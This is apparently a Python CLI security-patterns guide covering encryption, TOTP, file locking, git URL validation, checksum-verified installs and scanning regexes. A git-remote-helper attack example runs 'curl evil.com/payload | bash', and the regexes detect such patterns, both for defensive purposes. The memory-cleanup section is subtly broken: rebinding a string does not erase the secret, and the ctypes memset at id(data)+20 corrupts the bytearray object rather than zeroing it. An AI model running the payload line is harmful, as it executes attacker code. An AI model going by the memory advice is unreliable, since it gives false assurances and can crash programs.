# Security Patterns for Python CLI Applications

## 1. Fernet + PBKDF2 Encryption

### Key Derivation

```python
import hashlib
import base64
import secrets

PBKDF2_ITERATIONS = 600_000  # OWASP 2023 recommendation
SALT_SIZE = 32
KEY_SIZE = 32

def derive_key(passphrase: str, salt: bytes, iterations: int = PBKDF2_ITERATIONS) -> bytes:
    """Derive encryption key from passphrase using PBKDF2-HMAC-SHA256."""
    key = hashlib.pbkdf2_hmac(
        "sha256",
        passphrase.encode("utf-8"),
        salt,
        iterations,
        dklen=KEY_SIZE,
    )
    return base64.urlsafe_b64encode(key)
```

### Encrypt/Decrypt

```python
from cryptography.fernet import Fernet, InvalidToken

def encrypt(plaintext: str, passphrase: str) -> bytes:
    """Encrypt plaintext using passphrase-derived key."""
    salt = secrets.token_bytes(SALT_SIZE)
    key = derive_key(passphrase, salt)
    f = Fernet(key)
    ciphertext = f.encrypt(plaintext.encode("utf-8"))
    # Return salt + ciphertext for storage
    return salt + ciphertext

def decrypt(data: bytes, passphrase: str) -> str:
    """Decrypt data using passphrase."""
    salt = data[:SALT_SIZE]
    ciphertext = data[SALT_SIZE:]
    key = derive_key(passphrase, salt)
    f = Fernet(key)
    try:
        plaintext = f.decrypt(ciphertext)
        return plaintext.decode("utf-8")
    except InvalidToken:
        raise ValueError("Invalid passphrase or corrupted data")
```

### Secure Storage Class

```python
import json
from pathlib import Path
from typing import Any

class SecureStorage:
    """Secure file storage with encryption."""
    
    def __init__(self, path: Path, passphrase: str | None = None):
        self.path = path
        self._passphrase = passphrase
    
    def load(self) -> dict[str, Any]:
        if not self.path.exists():
            return {}
        data = self.path.read_bytes()
        if self._passphrase:
            plaintext = decrypt(data, self._passphrase)
            return json.loads(plaintext)
        return json.loads(data.decode("utf-8"))
    
    def save(self, data: dict[str, Any]) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        plaintext = json.dumps(data, indent=2)
        if self._passphrase:
            self.path.write_bytes(encrypt(plaintext, self._passphrase))
        else:
            self.path.write_text(plaintext, encoding="utf-8")
        self.path.chmod(0o600)
```

## 2. TOTP-Based 2FA

### Secret Generation

```python
import base64
import secrets

def generate_totp_secret() -> str:
    """Generate a new TOTP secret (base32-encoded)."""
    return base64.b32encode(secrets.token_bytes(20)).decode("utf-8")
```

### Code Verification

```python
import hmac
import hashlib
import struct
import time

HOTP_DIGITS = 6
HOTP_PERIOD = 30
HOTP_TOLERANCE = 1

def verify_totp(secret: str, code: str, tolerance: int = HOTP_TOLERANCE) -> bool:
    """Verify a TOTP code with clock skew tolerance."""
    try:
        secret_bytes = base64.b32decode(secret.upper())
    except Exception:
        return False
    
    t = int(time.time())
    for delta in range(-tolerance, tolerance + 1):
        counter = (t + delta * HOTP_PERIOD) // HOTP_PERIOD
        msg = struct.pack(">Q", counter)
        digest = hmac.new(secret_bytes, msg, hashlib.sha1).digest()
        offset = digest[-1] & 0x0F
        truncated = struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF
        expected = f"{truncated % 10 ** HOTP_DIGITS:0{HOTP_DIGITS}d}"
        if hmac.compare_digest(expected, code):
            return True
    return False
```

### Provisioning URI (for QR codes)

```python
def get_provisioning_uri(secret: str, account: str, issuer: str = "AIEP") -> str:
    """Get otpauth URI for QR code generation."""
    return (
        f"otpauth://totp/{issuer}:{account}"
        f"?secret={secret}&issuer={issuer}"
        f"&algorithm=SHA1&digits={HOTP_DIGITS}&period={HOTP_PERIOD}"
    )
```

## 3. Secure File Locking

### Exclusive Lock (Writer)

```python
import fcntl

def write_with_lock(path: Path, data: str) -> None:
    """Write file with exclusive lock to prevent race conditions."""
    with open(path, "w") as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        f.write(data)
        f.flush()
        fcntl.flock(f, fcntl.LOCK_UN)
```

### Shared Lock (Reader)

```python
def read_with_lock(path: Path) -> str:
    """Read file with shared lock."""
    with open(path, "r") as f:
        fcntl.flock(f, fcntl.LOCK_SH)
        data = f.read()
        fcntl.flock(f, fcntl.LOCK_UN)
        return data
```

## 4. Memory Cleanup for Secrets

### Problem

```python
# Bad: key remains in memory
store.set_api_key(name, key)
# key string object persists in memory until GC
```

### Solution

```python
# Good: overwrite key before GC
store.set_api_key(name, key)
key = "x" * len(key)  # Overwrite memory
```

### For Bytes

```python
import ctypes

def secure_zero(data: bytearray) -> None:
    """Zero out a bytearray."""
    ctypes.memset(id(data) + 20, 0, len(data))
```

## 5. Git Remote Helper Injection Prevention

### Attack Vector

```bash
# Attacker provides this URL:
ext::sh -c "curl evil.com/payload | bash"

# Git executes:
git remote add origin ext::sh -c "curl evil.com/payload | bash"
# Result: arbitrary code execution
```

### Validation

```bash
validate_git_url() {
    local url="$1"
    
    # Reject git remote helpers
    if echo "${url}" | grep -qE '^(ext::|--upload-pack=|ssh://.*\\|)'; then
        echo "ERROR: Git remote helpers are not allowed" >&2
        return 1
    fi
    
    # Whitelist URL schemes
    if ! echo "${url}" | grep -qE '^(https://|git@|git://)'; then
        echo "ERROR: Invalid URL format. Use https:// or git@" >&2
        return 1
    fi
    
    return 0
}
```

## 6. Supply Chain Verification

### Problem

```bash
# Bad: executes whatever the server returns
curl -LsSf https://example.com/installer.sh | sh
```

### Solution

```bash
# Good: verify checksum before execution
verify_and_run() {
    local url="$1"
    local expected_checksum="$2"
    local tmpfile=$(mktemp)
    
    curl -LsSf "${url}" -o "${tmpfile}"
    
    local actual_checksum
    actual_checksum=$(sha256sum "${tmpfile}" | awk '{print $1}')
    
    if [ "${expected_checksum}" != "${actual_checksum}" ]; then
        echo "ERROR: Checksum mismatch!" >&2
        echo "  Expected: ${expected_checksum}" >&2
        echo "  Actual:   ${actual_checksum}" >&2
        rm -f "${tmpfile}"
        return 1
    fi
    
    sh "${tmpfile}"
    rm -f "${tmpfile}"
}
```

## 7. Shell Input Sanitization

### Problem

```bash
# Bad: user input interpreted by shell
read -rp "Enter name: " name
echo "Hello ${name}"  # ${name} could contain $(), ``, etc.
```

### Solution

```bash
# Good: IFS= read -r prevents interpretation
IFS= read -rp "Enter name: " name
printf 'Hello %s\n' "${name}"  # printf is safer than echo
```

### Passing to Commands

```bash
# Bad: word splitting and globbing
rm ${filename}

# Good: quote and use --
rm -- "${filename}"

# Better: avoid shell entirely (Python)
subprocess.run(["rm", "--", filename])
```

## 8. Security Scanning Regex Patterns

### For Code Review

```python
import re

patterns = {
    "hardcoded_secrets": re.compile(
        r"""(?i)(api_key|secret|password|token|passwd|apikey)\s*=\s*['"][^'"]{6,}['"]"""
    ),
    "shell_injection": re.compile(
        r"""subprocess.*shell\s*=\s*True|os\.system\("""
    ),
    "git_remote_helper": re.compile(
        r"""ext::|--upload-pack="""
    ),
    "curl_pipe_bash": re.compile(
        r"""curl.*\|.*bash"""
    ),
    "silent_except": re.compile(
        r"""except.*:\s*\n\s*pass\s*$""",
        re.MULTILINE,
    ),
    "yaml_unsafe": re.compile(
        r"""yaml\.load\("""
    ),
    "eval_exec": re.compile(
        r"""\beval\s*\(|\bexec\s*\("""
    ),
    "debug_prints": re.compile(
        r"""print\s*\(\s*['"]DEBUG|print\s*\(\s*['"]TODO"""
    ),
}
```

## 9. Common Pitfalls

| Pitfall | Risk | Fix |
|---------|------|-----|
| `except: pass` | Hides errors, masks security failures | Use `logger.debug()` or propagate |
| `key = None` | String object persists in memory | Overwrite: `key = "x" * len(key)` |
| `yaml.load()` | Arbitrary code execution | Use `yaml.safe_load()` |
| `curl \| bash` | Supply chain attack | Verify checksum first |
| `git remote add ${url}` | Remote helper injection | Validate URL scheme |
| No `chmod 600` | Secrets world-readable | Always set permissions |
| No file locking | Race conditions on concurrent access | Use `fcntl.flock()` |
| `subprocess shell=True` | Shell injection | Use list args without shell |
| `debug = True` in prod | Information leakage | Default to False |
| Hardcoded secrets | Credential exposure | Use env vars or secure storage |

## 10. Python Security Libraries

| Library | Use Case | Install |
|---------|----------|---------|
| `cryptography` | Encryption (Fernet, AES) | `pip install cryptography` |
| `hashlib` | PBKDF2, SHA256 | Built-in |
| `hmac` | Constant-time comparison | Built-in |
| `secrets` | Cryptographic randomness | Built-in |
| `subprocess` | Safe shell execution | Built-in (avoid `shell=True`) |
| `ctypes` | Memory zeroing | Built-in |
| `fcntl` | File locking (Unix) | Built-in |
